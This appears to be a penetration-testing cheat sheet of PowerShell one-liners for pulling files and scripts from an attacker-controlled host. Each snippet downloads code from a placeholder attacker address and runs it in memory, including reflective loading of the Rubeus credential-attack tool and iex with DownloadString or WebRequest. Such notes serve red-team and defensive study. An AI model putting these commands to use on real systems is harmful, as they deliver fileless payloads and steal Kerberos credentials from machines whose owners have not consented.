# Powershell File Download

## Using Reflection - @Alh4zr3d

```powershell
$d = (New-Object http://System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')

[System.Reflection.Assembly]::Load($d)
[Rubeus.Program]::Main("triage".Split()) # replace "triage" by a command
```

## Classic

```powershell
# target Windows
iwr -Uri "http://{ip}:{port}/file" -Outfile "{destFile}"
iex (New-Object Net.WebClient).downloadString("http://{IPAttacker}/script.ps1")

# Net.WebClient DownloadString Method with variables
$downloader = New-Object System.Net.WebClient
$payload = "http://{IPAttacker/script.ps1}"
$command = $downloader.DownloadString($payload)
iex $command

# Net.WebRequest Method / execute scripts in memory
$req = [System.Net.WebRequest]::Create("http://{IPAttacker/script.ps1}")
$res = $req.GetResponse()
iex ([System.IO.StreamReader] ($res.GetResponse())).ReadToEnd()
```
